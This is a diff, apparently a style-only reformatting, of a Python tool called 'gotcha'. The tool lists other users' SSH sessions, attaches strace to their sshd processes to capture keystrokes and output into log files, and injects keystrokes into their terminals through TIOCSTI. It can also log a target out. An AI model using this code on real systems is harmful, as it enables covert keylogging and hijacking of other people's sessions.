@@ -4,25 +4,24 @@
 __updated__ = "2022-10-08 23:50:52"
 
 
-import termios
 import fcntl
-import sys
+import glob
+import json
 import os
 import re
-import json
-import time
-import glob
 import struct
-from typing import Any, List
-
-from threading import Thread
+import sys
+import termios
+import time
 from dataclasses import dataclass
-from subprocess import Popen, PIPE
+from subprocess import PIPE, Popen
+from threading import Thread
+from typing import Any, List
 
 # Ugly, but works!
 try:
     from ascii import SPECIAL_KEYS_DICT
-except  ImportError:
+except ImportError:
     from gotcha.ascii import SPECIAL_KEYS_DICT
 
 PS_UTIL = False
@@ -88,15 +87,15 @@ _exec_timestamp = time.strftime("%Y-%m-%d-%H%M", time.localtime())
 
 @dataclass
 class GotchaArgs:
-    """_summary_
-    """
+    """_summary_"""
+
     session_files: int = 1
     verbose: bool = False
     quiet: bool = False
     list: bool = False
-    tty: str = 'auto'
+    tty: str = "auto"
     auto: bool = False
-    replay: str = ''
+    replay: str = ""
     speed: int = 1
 
 
@@ -105,7 +104,7 @@ class GotchaTTY:
     """_summary_"""
 
     pid = None
-    tty: str = ''
+    tty: str = ""
     play = False
     working = True
 
@@ -124,7 +123,9 @@ class GotchaTTY:
         """
         _ = tty.replace("/dev/", "")
         proc = [
-            i for i in os.popen("ps -ef").read().split("\n") if _ in i and "sshd:" in i
+            i
+            for i in os.popen("ps -ef").read().split("\n")
+            if _ in i and "sshd:" in i
         ]
 
         if proc:
@@ -154,7 +155,9 @@ class GotchaTTY:
             ttys = [
                 (t.split()[1], t.split()[0])
                 for t in os.popen("last").read().split("\n")
-                if "logged" in t and "/" in t and not t.split()[1] == current_tty
+                if "logged" in t
+                and "/" in t
+                and not t.split()[1] == current_tty
             ]
         return ttys
 
@@ -163,7 +166,16 @@ class GotchaTTY:
         # Attach to sshd process and mirror all read() syscalls to our stdout
         """
         with Popen(
-            ["strace", "-s", "16384", "-p", self.pid, "-e", "read,write", "-q"],
+            [
+                "strace",
+                "-s",
+                "16384",
+                "-p",
+                self.pid,
+                "-e",
+                "read,write",
+                "-q",
+            ],
             shell=False,
             stdout=PIPE,
             stderr=PIPE,
@@ -172,13 +184,19 @@ class GotchaTTY:
             # Create output files.
             # keys-%Y-%m-%d-%H%M.gotcha.log
             if not os.path.isfile(self.session_file):
-                open(self.session_file, "w").close()  # pylint: disable=unspecified-encoding
+                open(
+                    self.session_file, "w"
+                ).close()  # pylint: disable=unspecified-encoding
 
             # sess-%Y-%m-%d-%H%M.gotcha.log
             if not os.path.isfile(self.keystrokes_file):
-                open(self.keystrokes_file, "w").close()  # pylint: disable=unspecified-encoding
+                open(
+                    self.keystrokes_file, "w"
+                ).close()  # pylint: disable=unspecified-encoding
 
-            with open(self.keystrokes_file, "a") as _fo:  # pylint: disable=unspecified-encoding
+            with open(
+                self.keystrokes_file, "a"
+            ) as _fo:  # pylint: disable=unspecified-encoding
                 _fo.write(f"{time.ctime()} {self.tty} {self.pid}:\n\n")
 
             _fdr = ""
@@ -206,16 +224,27 @@ class GotchaTTY:
                         # Need to find more elegant way to do it.
                         if not _fdr:
                             _fdl = re.findall(
-                                r"read\(([0-9]+), \".{1}\", 16384\) += 1", output
+                                r"read\(([0-9]+), \".{1}\", 16384\) += 1",
+                                output,
                             )
                             if isinstance(_fdl, list) and len(_fdl):
                                 _fdr = _fdl[0]
-                                eprint(f"[+] Target TTY keystrokes file: {self.keystrokes_file}")
-                                eprint(f"[+] Target TTY session file: {self.session_file}")
-                                eprint(f"\n[+] Attached to {self.tty} <stdout> file descriptor!")
+                                eprint(
+                                    f"[+] Target TTY keystrokes file: {self.keystrokes_file}"
+                                )
+                                eprint(
+                                    f"[+] Target TTY session file: {self.session_file}"
+                                )
+                                eprint(
+                                    f"\n[+] Attached to {self.tty} <stdout> file descriptor!"
+                                )
                                 eprint("[*] Let's Rock!!!\n")
-                                eprint(f"[!] WARNING: Be careful, know your input is mirrored to {self.tty}!")
-                                eprint("[!] Press Ctrl+C to exit observed session!")
+                                eprint(
+                                    f"[!] WARNING: Be careful, know your input is mirrored to {self.tty}!"
+                                )
+                                eprint(
+                                    "[!] Press Ctrl+C to exit observed session!"
+                                )
                         else:
                             self.write_session_file(output)
 
@@ -234,7 +263,10 @@ class GotchaTTY:
                     # e.g. $ while true; do echo "boom!"; done
                     time.sleep(0.01)
 
-                except (BlockingIOError, Exception) as error:  # pylint: disable=broad-except
+                except (
+                    BlockingIOError,
+                    Exception,
+                ) as error:  # pylint: disable=broad-except
                     # BlockingIOError: [Errno 11] write could not complete without blocking
                     eprint(f"BlockingIOError: {error}")
                     self.working = False
@@ -259,7 +291,9 @@ class GotchaTTY:
 
                 # Type ' ' and backspace to get first data, otherwise if
                 # no data received - the program will terminate
-                with open(self.tty) as _fi: # pylint: disable=unspecified-encoding
+                with open(
+                    self.tty
+                ) as _fi:  # pylint: disable=unspecified-encoding
                     for temp in [" ", "\x7f", "\r", "\n"]:  # '\x7f','\n']:
                         fcntl.ioctl(_fi, termios.TIOCSTI, temp)
                         time.sleep(0.05)
@@ -267,7 +301,9 @@ class GotchaTTY:
                 while self.working:
                     try:
                         cmd = sys.stdin.readline(1)
-                        with open(self.tty) as _f: # pylint: disable=unspecified-encoding
+                        with open(
+                            self.tty
+                        ) as _f:  # pylint: disable=unspecified-encoding
                             match cmd:
                                 # # Catch Ctrl+P and send hooking message
                                 case "\x1f":
@@ -275,7 +311,9 @@ class GotchaTTY:
 
                                 # forwarding Ctrl+D, this will logout the observed ssh session.
                                 case "\x04":
-                                    eprint("\n[!] GOTCHA: forwarding Ctrl+D, this will logout the observed ssh session!")
+                                    eprint(
+                                        "\n[!] GOTCHA: forwarding Ctrl+D, this will logout the observed ssh session!"
+                                    )
                                     eprint("\nSee you!")
                                     self.working = False
                                 # # Help Ctrl+H
@@ -284,12 +322,13 @@ class GotchaTTY:
                                 #
                                 # tweak for some apps that won't catch \n as Enter key
                                 # case "\n":
-                                    # cmd = "\r\n"
+                                # cmd = "\r\n"
 
                             # tweak for catch keys
                             if cmd:
                                 command = (
-                                    struct.pack("B", cmd) for cmd in os.fsencode(cmd)
+                                    struct.pack("B", cmd)
+                                    for cmd in os.fsencode(cmd)
                                 )
                                 for cmd in command:
                                     fcntl.ioctl(_f, termios.TIOCSTI, cmd)
@@ -306,7 +345,7 @@ class GotchaTTY:
 
     def attach(self, tty: str) -> None:
         """
-            Lazy mode, auto-attach to first found session
+        Lazy mode, auto-attach to first found session
         """
         try:
             if "auto" in tty:
@@ -338,11 +377,12 @@ class GotchaTTY:
             eprint("\n\n[!] Ctrl+C detected...\nSee you!\n")
 
     def list(self) -> None:
-        """_summary_
-        """
+        """_summary_"""
         eprint(f"{'USER':<10} {'PID':<10} {'TTY':<10}")
         for _t, _u in self.__tty_list():
-            eprint(f"{_u:<10} {self.__get_pid_of_tty(_t):<10} {'/dev/'+_t:<10}")
+            eprint(
+                f"{_u:<10} {self.__get_pid_of_tty(_t):<10} {'/dev/'+_t:<10}"
+            )
 
     def replay(self, session: str = None) -> None:
         """_summary_"""
@@ -358,7 +398,9 @@ class GotchaTTY:
             eprint(session_file)
             eprint("-" * len(session_file))
 
-            for line in open(self.session_file):  # pylint: disable=unspecified-encoding
+            for line in open(
+                self.session_file
+            ):  # pylint: disable=unspecified-encoding
                 try:
                     _d = json.loads(line)
                     now = float(_d["d"])
@@ -391,7 +433,9 @@ class GotchaTTY:
             # Replace special keys to readable values in output file
             pchar = SPECIAL_KEYS_DICT[pchar]
 
-        with open(self.keystrokes_file, "a") as _fi:  # pylint: disable=unspecified-encoding
+        with open(
+            self.keystrokes_file, "a"
+        ) as _fi:  # pylint: disable=unspecified-encoding
             _fi.write(pchar)
 
     def write_session_file(self, output="") -> None:
@@ -413,7 +457,7 @@ class GotchaTTY:
 
     def session_list(self, columns: int = 3) -> Any:
         """
-            session_list
+        session_list
         """
         lst_files = glob.glob("/var/log/*sess*.log")
         lst_files.sort(key=os.path.getmtime)
@@ -425,13 +469,17 @@ class GotchaTTY:
 
         match columns:
             case 3:
-                for first, second, third in zip(lst[::columns], lst[1::columns], lst[2::columns]):
+                for first, second, third in zip(
+                    lst[::columns], lst[1::columns], lst[2::columns]
+                ):
                     eprint(f"{first: <10}   {second: <10}   {third}")
             case 2:
                 for first, second in zip(lst[::columns], lst[1::columns]):
                     eprint(f"{first: <10}   {second: <10}")
             case 1:
-                [eprint(l) for l in lst]  # pylint: disable=expression-not-assigned
+                [
+                    eprint(l) for l in lst
+                ]  # pylint: disable=expression-not-assigned
 
     def send_key(self, key: str, tty: any) -> None:
         """
